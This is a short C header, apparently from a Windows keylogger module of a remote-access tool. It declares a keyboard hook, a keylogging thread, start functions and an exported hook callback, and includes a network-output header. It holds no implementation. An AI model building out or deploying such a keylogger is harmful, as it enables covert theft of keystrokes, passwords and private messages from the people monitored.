#ifndef				_RXKEYLOG_H__
# define			_RXKEYLOG_H__

#include			<Windows.h>
#include			<Psapi.h>
#include			<string>
#include			"RxNetOut.h"


/* Globals */
static HHOOK		hKeyHook;
static HWND			oldHandle;
extern HANDLE		keyLogThread;

void				AnsAskAkl();
void				AnsAskOkl();
bool				RxStartKeyLog();
DWORD	WINAPI		RxKeyLog();

void				RxMsgLoop();

__declspec(dllexport)LRESULT CALLBACK	RxKeyEvent(int, WPARAM, LPARAM);

#endif				// _RXKEYLOG_H__
